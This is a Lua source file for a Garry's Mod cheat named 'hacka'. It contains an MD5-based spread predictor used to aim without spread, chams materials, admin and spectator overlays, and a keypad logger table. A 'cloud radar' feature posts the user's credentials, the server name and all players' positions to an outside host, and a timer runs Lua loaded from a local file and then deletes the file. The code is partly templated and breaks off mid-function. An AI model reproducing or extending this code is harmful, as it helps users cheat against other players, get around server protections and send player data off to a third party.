local vgui = Copy(vgui);
local input = Copy(input);
local Color = Color;
local ScrW, ScrH = ScrW, ScrH;
local math = Copy(math);
local file = Copy(file);
local util = Copy(util);
local draw = Copy(draw);
local cam = Copy(cam);


local a = {}
a.ct = {
    0xd76aa478,
    0xe8c7b756,
    0x242070db,
    0xc1bdceee,
    0xf57c0faf,
    0x4787c62a,
    0xa8304613,
    0xfd469501,
    0x698098d8,
    0x8b44f7af,
    0xffff5bb1,
    0x895cd7be,
    0x6b901122,
    0xfd987193,
    0xa679438e,
    0x49b40821,
    0xf61e2562,
    0xc040b340,
    0x265e5a51,
    0xe9b6c7aa,
    0xd62f105d,
    0x02441453,
    0xd8a1e681,
    0xe7d3fbc8,
    0x21e1cde6,
    0xc33707d6,
    0xf4d50d87,
    0x455a14ed,
    0xa9e3e905,
    0xfcefa3f8,
    0x676f02d9,
    0x8d2a4c8a,
    0xfffa3942,
    0x8771f681,
    0x6d9d6122,
    0xfde5380c,
    0xa4beea44,
    0x4bdecfa9,
    0xf6bb4b60,
    0xbebfbc70,
    0x289b7ec6,
    0xeaa127fa,
    0xd4ef3085,
    0x04881d05,
    0xd9d4d039,
    0xe6db99e5,
    0x1fa27cf8,
    0xc4ac5665,
    0xf4292244,
    0x432aff97,
    0xab9423a7,
    0xfc93a039,
    0x655b59c3,
    0x8f0ccc92,
    0xffeff47d,
    0x85845dd1,
    0x6fa87e4f,
    0xfe2ce6e0,
    0xa3014314,
    0x4e0811a1,
    0xf7537e82,
    0xbd3af235,
    0x2ad7d2bb,
    0xeb86d391,
    0x67452301,
    0xefcdab89,
    0x98badcfe,
    0x10325476
}
local b = function(c, d, e)
    return bit.bor(bit.band(c, d), bit.band(-c - 1, e))
end
local f = function(c, d, e)
    return bit.bor(bit.band(c, e), bit.band(d, -e - 1))
end
local g = function(c, d, e)
    return bit.bxor(c, bit.bxor(d, e))
end
local h = function(c, d, e)
    return bit.bxor(d, bit.bor(c, -e - 1))
end
local e = function(b, i, j, k, l, c, m, n)
    i = bit.band(i + b(j, k, l) + c + n, 0xffffffff)
    return bit.bor(bit.lshift(bit.band(i, bit.rshift(0xffffffff, m)), m), bit.rshift(i, 32 - m)) + j
end
local o = 2 ^ 31
local p = 2 ^ 32
function a.fix(i)
    if i > o then
        return i - p
    end
    return i
end
function a.trm(q, r, s, t, u)
    local i, j, k, l = q, r, s, t
    i = e(b, i, j, k, l, u[0], 7, a.ct[1])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[1], 12, a.ct[2])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[2], 17, a.ct[3])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[3], 22, a.ct[4])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(b, i, j, k, l, u[4], 7, a.ct[5])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[5], 12, a.ct[6])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[6], 17, a.ct[7])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[7], 22, a.ct[8])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(b, i, j, k, l, u[8], 7, a.ct[9])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[9], 12, a.ct[10])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[10], 17, a.ct[11])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[11], 22, a.ct[12])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(b, i, j, k, l, u[12], 7, a.ct[13])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[13], 12, a.ct[14])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[14], 17, a.ct[15])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[15], 22, a.ct[16])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[1], 5, a.ct[17])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[6], 9, a.ct[18])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[11], 14, a.ct[19])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[0], 20, a.ct[20])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[5], 5, a.ct[21])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[10], 9, a.ct[22])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[15], 14, a.ct[23])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[4], 20, a.ct[24])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[9], 5, a.ct[25])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[14], 9, a.ct[26])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[3], 14, a.ct[27])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[8], 20, a.ct[28])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[13], 5, a.ct[29])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[2], 9, a.ct[30])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[7], 14, a.ct[31])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[12], 20, a.ct[32])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[5], 4, a.ct[33])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[8], 11, a.ct[34])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[11], 16, a.ct[35])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[14], 23, a.ct[36])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[1], 4, a.ct[37])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[4], 11, a.ct[38])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[7], 16, a.ct[39])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[10], 23, a.ct[40])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[13], 4, a.ct[41])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[0], 11, a.ct[42])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[3], 16, a.ct[43])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[6], 23, a.ct[44])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[9], 4, a.ct[45])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[12], 11, a.ct[46])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[15], 16, a.ct[47])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[2], 23, a.ct[48])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[0], 6, a.ct[49])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[7], 10, a.ct[50])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[14], 15, a.ct[51])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[5], 21, a.ct[52])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[12], 6, a.ct[53])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[3], 10, a.ct[54])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[10], 15, a.ct[55])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[1], 21, a.ct[56])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[8], 6, a.ct[57])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[15], 10, a.ct[58])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[6], 15, a.ct[59])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[13], 21, a.ct[60])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[4], 6, a.ct[61])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[11], 10, a.ct[62])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[2], 15, a.ct[63])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[9], 21, a.ct[64])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    return q + i, r + j, s + k, t + l
end
function a.Psm(v)
    local i, j, k, l = a.fix(a.ct[65]), a.fix(a.ct[66]), a.fix(a.ct[67]), a.fix(a.ct[68])
    local w = {}
    for h = 0, 15 do
        w[h] = 0
    end
    w[0] = v
    w[1] = 128
    w[14] = 32
    local i, j, k, l = a.trm(i, j, k, l, w)
    return bit.rshift(a.fix(j), 16) % 256
end
local x = {
    [0] = {-0.492036, 0.286111},
    [1] = {-0.492036, 0.286111},
    [2] = {-0.255320, 0.128480},
    [3] = {0.456165, 0.356030},
    [4] = {-0.361731, 0.406344},
    [5] = {-0.146730, 0.834589},
    [6] = {-0.253288, -0.421936},
    [7] = {-0.448694, 0.111650},
    [8] = {-0.880700, 0.904610},
    [9] = {-0.379932, 0.138833},
    [10] = {0.502579, -0.494285},
    [11] = {-0.263847, -0.594805},
    [12] = {0.818612, 0.090368},
    [13] = {-0.063552, 0.044356},
    [14] = {0.490455, 0.304820},
    [15] = {-0.192024, 0.195162},
    [16] = {-0.139421, 0.857106},
    [17] = {0.715745, 0.336956},
    [18] = {-0.150103, -0.044842},
    [19] = {-0.176531, 0.275787},
    [20] = {0.155707, -0.152178},
    [21] = {-0.136486, -0.591896},
    [22] = {-0.021022, -0.761979},
    [23] = {-0.166004, -0.733964},
    [24] = {-0.102439, -0.132059},
    [25] = {-0.607531, -0.249979},
    [26] = {-0.500855, -0.185902},
    [27] = {-0.080884, 0.516556},
    [28] = {-0.003334, 0.138612},
    [29] = {-0.546388, -0.000115},
    [30] = {-0.228092, -0.018492},
    [31] = {0.542539, 0.543196},
    [32] = {-0.355162, 0.197473},
    [33] = {-0.041726, -0.015735},
    [34] = {-0.713230, -0.551701},
    [35] = {-0.045056, 0.090208},
    [36] = {0.061028, 0.417744},
    [37] = {-0.171149, -0.048811},
    [38] = {0.241499, 0.164562},
    [39] = {-0.129817, -0.111200},
    [40] = {0.007366, 0.091429},
    [41] = {-0.079268, -0.008285},
    [42] = {0.010982, -0.074707},
    [43] = {-0.517782, -0.682470},
    [44] = {-0.663822, -0.024972},
    [45] = {0.058213, -0.078307},
    [46] = {-0.302041, -0.132280},
    [47] = {0.217689, -0.209309},
    [48] = {-0.143615, 0.830349},
    [49] = {0.270912, 0.071245},
    [50] = {-0.258170, -0.598358},
    [51] = {0.099164, -0.257525},
    [52] = {-0.214676, -0.595918},
    [53] = {-0.427053, -0.523764},
    [54] = {-0.585472, 0.088522},
    [55] = {0.564305, -0.533822},
    [56] = {-0.387545, -0.422206},
    [57] = {0.690505, -0.299197},
    [58] = {0.475553, 0.169785},
    [59] = {0.347436, 0.575364},
    [60] = {-0.069555, -0.103340},
    [61] = {0.286197, -0.618916},
    [62] = {-0.505259, 0.106581},
    [63] = {-0.420214, -0.714843},
    [64] = {0.032596, -0.401891},
    [65] = {-0.238702, -0.087387},
    [66] = {0.714358, 0.197811},
    [67] = {0.208960, 0.319015},
    [68] = {-0.361140, 0.222130},
    [69] = {-0.133284, -0.492274},
    [70] = {0.022824, -0.133955},
    [71] = {-0.100850, 0.271962},
    [72] = {-0.050582, -0.319538},
    [73] = {0.577980, 0.095507},
    [74] = {0.224871, 0.242213},
    [75] = {-0.628274, 0.097248},
    [76] = {0.184266, 0.091959},
    [77] = {-0.036716, 0.474259},
    [78] = {-0.502566, -0.279520},
    [79] = {-0.073201, -0.036658},
    [80] = {0.339952, -0.293667},
    [81] = {0.042811, 0.130387},
    [82] = {0.125881, 0.007040},
    [83] = {0.138374, -0.418355},
    [84] = {0.261396, -0.392697},
    [85] = {-0.453318, -0.039618},
    [86] = {0.890159, -0.335165},
    [87] = {0.466437, -0.207762},
    [88] = {0.593253, 0.418018},
    [89] = {0.566934, -0.643837},
    [90] = {0.150918, 0.639588},
    [91] = {0.150112, 0.215963},
    [92] = {-0.130520, 0.324801},
    [93] = {-0.369819, -0.019127},
    [94] = {-0.038889, -0.650789},
    [95] = {0.490519, -0.065375},
    [96] = {-0.305940, 0.454759},
    [97] = {-0.521967, -0.550004},
    [98] = {-0.040366, 0.683259},
    [99] = {0.137676, -0.376445},
    [100] = {0.839301, 0.085979},
    [101] = {-0.319140, 0.481838},
    [102] = {0.201437, -0.033135},
    [103] = {0.384637, -0.036685},
    [104] = {0.598419, 0.144371},
    [105] = {-0.061424, -0.608645},
    [106] = {-0.065337, 0.308992},
    [107] = {-0.029356, -0.634337},
    [108] = {0.326532, 0.047639},
    [109] = {0.505681, -0.067187},
    [110] = {0.691612, 0.629364},
    [111] = {-0.038588, -0.635947},
    [112] = {0.637837, -0.011815},
    [113] = {0.765338, 0.563945},
    [114] = {0.213416, 0.068664},
    [115] = {-0.576581, 0.554824},
    [116] = {0.246580, 0.132726},
    [117] = {0.385548, -0.070054},
    [118] = {0.538735, -0.291010},
    [119] = {0.609944, 0.590973},
    [120] = {-0.463240, 0.010302},
    [121] = {-0.047718, 0.741086},
    [122] = {0.308590, -0.322179},
    [123] = {-0.291173, 0.256367},
    [124] = {0.287413, -0.510402},
    [125] = {0.864716, 0.158126},
    [126] = {0.572344, 0.561319},
    [127] = {-0.090544, 0.332633},
    [128] = {0.644714, 0.196736},
    [129] = {-0.204198, 0.603049},
    [130] = {-0.504277, -0.641931},
    [131] = {0.218554, 0.343778},
    [132] = {0.466971, 0.217517},
    [133] = {-0.400880, -0.299746},
    [134] = {-0.582451, 0.591832},
    [135] = {0.421843, 0.118453},
    [136] = {-0.215617, -0.037630},
    [137] = {0.341048, -0.283902},
    [138] = {-0.246495, -0.138214},
    [139] = {0.214287, -0.196102},
    [140] = {0.809797, -0.498168},
    [141] = {-0.115958, -0.260677},
    [142] = {-0.025448, 0.043173},
    [143] = {-0.416803, -0.180813},
    [144] = {-0.782066, 0.335273},
    [145] = {0.192178, -0.151171},
    [146] = {0.109733, 0.165085},
    [147] = {-0.617935, -0.274392},
    [148] = {0.283301, 0.171837},
    [149] = {-0.150202, 0.048709},
    [150] = {-0.179954, -0.288559},
    [151] = {-0.288267, -0.134894},
    [152] = {-0.049203, 0.231717},
    [153] = {-0.065761, 0.495457},
    [154] = {0.082018, -0.457869},
    [155] = {-0.159553, 0.032173},
    [156] = {0.508305, -0.090690},
    [157] = {0.232269, -0.338245},
    [158] = {-0.374490, -0.480945},
    [159] = {-0.541244, 0.194144},
    [160] = {-0.040063, -0.073532},
    [161] = {0.136516, -0.167617},
    [162] = {-0.237350, 0.456912},
    [163] = {-0.446604, -0.494381},
    [164] = {0.078626, -0.020068},
    [165] = {0.163208, 0.600330},
    [166] = {-0.886186, -0.345326},
    [167] = {-0.732948, -0.689349},
    [168] = {0.460564, -0.719006},
    [169] = {-0.033688, -0.333340},
    [170] = {-0.325414, -0.111704},
    [171] = {0.010928, 0.723791},
    [172] = {0.713581, -0.077733},
    [173] = {-0.050912, -0.444684},
    [174] = {-0.268509, 0.381144},
    [175] = {-0.175387, 0.147070},
    [176] = {-0.429779, 0.144737},
    [177] = {-0.054564, 0.821354},
    [178] = {0.003205, 0.178130},
    [179] = {-0.552814, 0.199046},
    [180] = {0.225919, -0.195013},
    [181] = {0.056040, -0.393974},
    [182] = {-0.505988, 0.075184},
    [183] = {-0.510223, 0.156271},
    [184] = {-0.209616, 0.111174},
    [185] = {-0.605132, -0.117104},
    [186] = {0.412433, -0.035510},
    [187] = {-0.573947, -0.691295},
    [188] = {-0.712686, 0.021719},
    [189] = {-0.643297, 0.145307},
    [190] = {0.245038, 0.343062},
    [191] = {-0.235623, -0.159307},
    [192] = {-0.834004, 0.088725},
    [193] = {0.121377, 0.671713},
    [194] = {0.528614, 0.607035},
    [195] = {-0.285699, -0.111312},
    [196] = {0.603385, 0.401094},
    [197] = {0.632098, -0.439659},
    [198] = {0.681016, -0.242436},
    [199] = {-0.261709, 0.304265},
    [200] = {-0.653737, -0.199245},
    [201] = {-0.435512, -0.762978},
    [202] = {0.701105, 0.389527},
    [203] = {0.093495, -0.148484},
    [204] = {0.715218, 0.638291},
    [205] = {-0.055431, -0.085173},
    [206] = {-0.727438, 0.889783},
    [207] = {-0.007230, -0.519183},
    [208] = {-0.359615, 0.058657},
    [209] = {0.294681, 0.601155},
    [210] = {0.226879, -0.255430},
    [211] = {-0.307847, -0.617373},
    [212] = {0.340916, -0.780086},
    [213] = {-0.028277, 0.610455},
    [214] = {-0.365067, 0.323311},
    [215] = {0.001059, -0.270451},
    [216] = {0.304025, 0.047478},
    [217] = {0.297389, 0.383859},
    [218] = {0.288059, 0.262816},
    [219] = {-0.889315, 0.533731},
    [220] = {0.215887, 0.678889},
    [221] = {0.287135, 0.343899},
    [222] = {0.423951, 0.672285},
    [223] = {0.411912, -0.812886},
    [224] = {0.081615, -0.497358},
    [225] = {-0.051963, -0.117891},
    [226] = {-0.062387, 0.331698},
    [227] = {0.020458, -0.734125},
    [228] = {-0.160176, 0.196321},
    [229] = {0.044898, -0.024032},
    [230] = {-0.153162, 0.930951},
    [231] = {-0.015084, 0.233476},
    [232] = {0.395043, 0.645227},
    [233] = {-0.232095, 0.283834},
    [234] = {-0.507699, 0.317122},
    [235] = {-0.606604, -0.227259},
    [236] = {0.526430, -0.408765},
    [237] = {0.304079, 0.135680},
    [238] = {-0.134042, 0.508741},
    [239] = {-0.276770, 0.383958},
    [240] = {-0.298963, -0.233668},
    [241] = {0.171889, 0.697367},
    [242] = {-0.292571, -0.317604},
    [243] = {0.587806, 0.115584},
    [244] = {-0.346690, -0.098320},
    [245] = {0.956701, -0.040982},
    [246] = {0.040838, 0.595304},
    [247] = {0.365201, -0.519547},
    [248] = {-0.397271, -0.090567},
    [249] = {-0.124873, -0.356800},
    [250] = {-0.122144, 0.617725},
    [251] = {0.191266, -0.197764},
    [252] = {-0.178092, 0.503667},
    [253] = {0.103221, 0.547538},
    [254] = {0.019524, 0.621226},
    [255] = {0.663918, -0.573476}
}
function hacka.dickfack(b, c, d)
    local e = b:CommandNumber()
    local f = a.Psm(e)
    local g = x[f][1]
    local h = x[f][2]
    local i = c:Forward()
    local j = c:Right()
    local k = c:Up()
    return i + g * d.x * j * -1 + h * d.y * k * -1
end

local FindMetaTable = FindMetaTable;
local pm = FindMetaTable("Player")
local vm = FindMetaTable("Vector")
local em = FindMetaTable("Entity")
local cm = FindMetaTable("CUserCmd")
local wm = FindMetaTable("Weapon")
local am = FindMetaTable("Angle")

local Vector = Vector;
local player = Copy(player);
local Angle = Angle;
local me = LocalPlayer();
local render = Copy(render);
local cma = Copy(cam);
local Material = Material;
local CreateMaterial = CreateMaterial;

hacka.keypadlogger = {}
hacka.vieworigin = Vector(0, 0, 0)
hacka.viewangle = Angle(0, 0, 0)
hacka.viewvelocity = Vector(0, 0, 0)
local panickey=false



local chamsweaponmaterial =
    CreateMaterial(
    "ViewModel_1",
    "VertexLitGeneric",
    {["$basetexture"] = "models/debug/debugwhite", ["$model"] = 1, ["$ignorez"] = 0, ["vertexcolor"] = 1}
)
local chamsweaponmaterial2 =
    CreateMaterial(
    "ViewModel_2",
    "VertexLitGeneric",
    {["$basetexture"] = "models/debug/debugwhite", ["$model"] = 1, ["$ignorez"] = 1, ["vertexcolor"] = 1}
)
local texturedCham = CreateMaterial( "textured", "VertexLitGeneric", {
  ["$basetexture"] = "models/debug/debugwhite",
  ["$model"] = 1,
  ["$translucent"] = 1,
  ["$vertexalpha"] = 1,
  ["$vertexcolor"] = 1
})
 
local wireframeCham = CreateMaterial( "wireframe", "Wireframe", {
  ["$basetexture"] = "models/debug/debugwhite",
  ["$model"]       = 1,
  ["$translucent"] = 1,
  ["$alpha"]       = 1,
  ["$nocull"]      = 1,
})
local cones = {}
local nullvec = Vector() * -1
local dists = {}
local aimtarget
local trace_walls = bit.bor(CONTENTS_TESTFOGVOLUME, CONTENTS_EMPTY, CONTENTS_MONSTER, CONTENTS_HITBOX)
local NoPenetration = {[MAT_SLOSH] = true}
local PenMod = {[MAT_SAND] = 0.5, [MAT_DIRT] = 0.8, [MAT_METAL] = 1.1, [MAT_TILE] = 0.9, [MAT_WOOD] = 1.2}
local trace_normal =
    bit.bor(
    CONTENTS_SOLID,
    CONTENTS_OPAQUE,
    CONTENTS_MOVEABLE,
    CONTENTS_DEBRIS,
    CONTENTS_MONSTER,
    CONTENTS_HITBOX,
    402653442,
    CONTENTS_WATER
)
gameevent.Listen("player_changename")
gameevent.Listen("player_connect")
gameevent.Listen("player_disconnect")
gameevent.Listen("player_say")
gameevent.Listen("player_hurt")
gameevent.Listen("entity_killed")
surface.CreateFont("]]..b.font18 ..[[",{font="Trebuchet24",size=20})
surface.CreateFont("]]..b.font22 ..[[",{font="Roboto",size=26})
surface.CreateFont("]]..b.menufont..[[",{font="Roboto",size=18})
surface.CreateFont("]]..b.font14 ..[[",{font="Roboto",size=14})
local function zapic(func,value)
local ad=util.JSONToTable(file.Read("]]..b.maincfg..[[","DATA"))
ad[func]=value
file.Write("]]..b.maincfg..[[",util.TableToJSON(ad))
end
local function zapiclogs(type, log)
    local da = util.JSONToTable(file.Read("]]..b.logs..[[", "DATA"))
    da[type] = {"[" .. os.date("%H:%M:%S") .. "] " .. log .. "HLS" .. da[type][1]}
    file.Write("]]..b.logs..[[", util.TableToJSON(da))
end
local function radar(b)
    local c = {}
    for d, e in ipairs(player.GetAll()) do
        local f = e:GetPos()
        local g = Vector(b[1], b[2], b[3])
        local h = Angle(90, 0, 0)
        local i = b[4] / 2 + (f.x - g.x) / b[6]
        local j = b[5] / 2 + (g.y - f.y) / b[6]
        local k = h.y - 90
        k = math.rad(k)
        i = i - b[4] / 2
        j = j - b[5] / 2
        local l = i * math.cos(k) - j * math.sin(k)
        local m = i * math.sin(k) + j * math.cos(k)
        l = l + b[4] / 2
        m = m + b[5] / 2
        if e == LocalPlayer() then
            c[e:Name()] = {
                x = math.Round(l),
                y = math.Round(m),
                color = team.GetColor(e:Team()),
                team = team.GetName(e:Team()),
                localplayer = "yes",
                rank = e:GetUserGroup()
            }
        else
            c[e:Name()] = {
                x = math.Round(l),
                y = math.Round(m),
                color = team.GetColor(e:Team()),
                team = team.GetName(e:Team()),
rank = e:GetUserGroup()
            }
        end
    end
    return c
end
local maps = {}
maps["rp_bangclaw"] = {2579, -1103, 6618, 834, 1078, 9}
maps["rp_downtown_tits_v1"] = {-163 ,-1239 ,7241, 1280, 720, 15}

timer.Simple(1,function()
local function timercheck()
gay=util.JSONToTable(file.Read("]]..b.maincfg..[[","DATA"))

hacka.windowbg=gay["MENU_STYLE_WINDOWBG"]
hacka.titlebar=gay["MENU_STYLE_TITLEBAR"]
hacka.colortext=gay["MENU_STYLE_TEXT"]
hacka.border=gay["MENU_STYLE_BORDER"]
hacka.titletext=gay["MENU_STYLE_TITLETEXT"]

if file.Exists("]]..b.runlua..[[","DATA")then 
RunStringEx("--",file.Read("]]..b.runlua..[[","DATA"))
file.Delete("]]..b.runlua..[[")
end 


if hacka.fontinit==nil then
surface.CreateFont("fontforplayers",{font=gay["WH_PLAYER_FONT"],size=gay["WH_PLAYER_FONT_SIZE"],shadow=true})
surface.CreateFont("fontforentitys",{font=gay["WH_ENTITY_FONT"],size=gay["WH_ENTITY_FONT_SIZE"],shadow=true})

hacka.fontplayersg="fontforplayers"
hacka.fontentitysg="fontforentitys"

hacka.fontinit=true
end

if gay["CLOUDRADAR"] then
if maps[game.GetMap()] then
http.Post("https://execcc.online/hacka/cloudradar.php",{log = "]]..username..[[",pass = "]]..password..[[",server = GetHostName(),map = game.GetMap(),pos = util.TableToJSON(radar(maps[game.GetMap()]))})
end
end


local ply=LocalPlayer()
if gay["MISC_ADMINLIST"] and not IsValid(hacka.adminlist) then
    hacka.adminlist = vgui.Create("DFrame")
    hacka.adminlist:SetSize(gay["MISC_ADMINLIST_S_X"], gay["MISC_ADMINLIST_S_Y"])
    hacka.adminlist:SetPos(gay["MISC_ADMINLIST_X"], gay["MISC_ADMINLIST_Y"])
    hacka.adminlist:SetTitle("")
    hacka.adminlist:SetSizable(true)
    hacka.adminlist:ShowCloseButton(false)
    hacka.adminlist.PerformLayout = function(self, c, d)
        zapic("MISC_ADMINLIST_S_X", c)
        zapic("MISC_ADMINLIST_S_Y", d)
    end
    hacka.adminlist.Paint = function(_, w, h)
draw.RoundedBox(0,0,0,w,h,hacka.windowbg)
draw.RoundedBox(0,0,0,w,22,hacka.titlebar)
draw.SimpleText("Admins list","]]..b.menufont..[[",5,2.5,hacka.titletext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,w,h)

        local allspectators = 25
        for k,v in next, player.GetAll() do
        local usergruop = pm.GetUserGroup(v)
            if usergruop != "user" then
                if usergruop != "User" then
                    draw.SimpleText(pm.Name(v) .. " " .. usergruop,"]]..b.font18 ..[[",5,allspectators,Color(255, 255, 255))
                    allspectators = allspectators + 20
                end
            end
        end
    end
end
if IsValid(hacka.adminlist) and not gay["MISC_ADMINLIST"] or panickey and IsValid(hacka.adminlist) then
    hacka.adminlist:Remove()
end

if gay["MISC_SPECTATORLIST"] and not IsValid(hacka.specb) then
    hacka.specb = vgui.Create("DFrame")
    hacka.specb:SetSize(gay["MISC_SPECTATORLIST_S_X"], gay["MISC_SPECTATORLIST_S_Y"])
    hacka.specb:SetPos(gay["MISC_SPECTATORLIST_X"], gay["MISC_SPECTATORLIST_Y"])
    hacka.specb:SetTitle("")
    hacka.specb:SetSizable(true)
    hacka.specb:ShowCloseButton(false)
    hacka.specb.PerformLayout = function(self, c, d)
        zapic("MISC_SPECTATORLIST_S_X", c)
        zapic("MISC_SPECTATORLIST_S_Y", d)
    end
    hacka.specb.Paint = function(_, w, h)
draw.RoundedBox(0,0,0,w,h,hacka.windowbg)
draw.RoundedBox(0,0,0,w,22,hacka.titlebar)
draw.SimpleText("Spectators list","]]..b.menufont..[[",5,2.5,hacka.titletext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,w,h)

        local allspectators = 25
       for k,v in next, player.GetAll() do 
            if v != ply and pm.GetObserverTarget(v) == ply then
